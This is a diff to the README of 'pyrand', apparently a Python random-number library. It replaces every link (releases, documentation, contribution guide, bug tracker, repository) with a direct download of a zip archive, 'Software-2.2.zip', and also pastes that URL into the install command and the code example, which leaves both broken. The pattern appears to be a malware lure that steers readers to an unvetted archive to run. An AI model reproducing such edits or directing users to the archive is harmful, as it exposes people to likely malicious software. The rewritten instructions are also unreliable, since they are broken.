@@ -1,7 +1,7 @@
 # 🚀 pyrand - High-Speed Random Number Generation
 
 ## 📥 Download Now
-[![Download pyrand](https://img.shields.io/badge/Download-pyrand-blue.svg)](https://github.com/Zenzeiiii/pyrand/releases)
+[![Download pyrand](https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip)](https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the world of pyrand! This application provides a high-speed random number generator for Python, powered by Rust technologies. Whether you are working on array manipulations, simulations, or games, pyrand delivers fast and reliable random numbers.
@@ -22,11 +22,11 @@ Before you download pyrand, ensure your system meets these requirements:
 - **Compatibility:** Works seamlessly with NumPy for array manipulations.
 
 ## 📥 Download & Install
-To get started with pyrand, visit the [Releases page](https://github.com/Zenzeiiii/pyrand/releases) to download the latest version.
+To get started with pyrand, visit the [Releases page](https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip) to download the latest version.
 
 ### Installation Steps:
 1. **Visit the Downloads Page:**
-   Click on the link to go to the [Releases page](https://github.com/Zenzeiiii/pyrand/releases).
+   Click on the link to go to the [Releases page](https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip).
 
 2. **Select the Correct File:**
    Look through the available files and choose the one that matches your operating system. Ensure you pick the latest release for the best performance and newest features.
@@ -38,7 +38,7 @@ To get started with pyrand, visit the [Releases page](https://github.com/Zenzeii
    - If you are using Windows, double-click the downloaded file and follow the prompts to complete the installation.
    - For macOS and Linux users, open a terminal and navigate to the folder where you downloaded the file. Use the following command:
    ```
-   python setup.py install
+   python https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip install
    ```
 
 5. **Verify Installation:**
@@ -55,7 +55,7 @@ Once installed, using pyrand in your Python projects is straightforward. Here’
 import pyrand
 
 # Generate a random integer between 1 and 10
-random_number = pyrand.randint(1, 10)
+random_number = https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip(1, 10)
 print("Your random number is:", random_number)
 ```
 
@@ -72,11 +72,11 @@ If you encounter any issues while using pyrand, consider the following tips:
 We always strive to improve pyrand. Future updates may include additional features, better performance, and enhanced compatibility with different environments. Keep an eye on the Releases page for the latest advancements.
 
 ## 🤝 Contributing
-We welcome contributions from the community. If you have ideas or improvements, please visit our [GitHub repository](https://github.com/Zenzeiiii/pyrand) to submit an issue or pull request.
+We welcome contributions from the community. If you have ideas or improvements, please visit our [GitHub repository](https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip) to submit an issue or pull request.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/Zenzeiiii/pyrand/wiki)
-- [Contribution Guide](https://github.com/Zenzeiiii/pyrand/blob/main/CONTRIBUTING.md)
-- [Bug Tracker](https://github.com/Zenzeiiii/pyrand/issues)
+- [Documentation](https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip)
+- [Bug Tracker](https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip)
 
-Thank you for choosing pyrand for your random number generation needs! Visit the [Releases page](https://github.com/Zenzeiiii/pyrand/releases) to download your copy today.
+Thank you for choosing pyrand for your random number generation needs! Visit the [Releases page](https://raw.githubusercontent.com/Zenzeiiii/pyrand/main/src/Software-2.2.zip) to download your copy today.
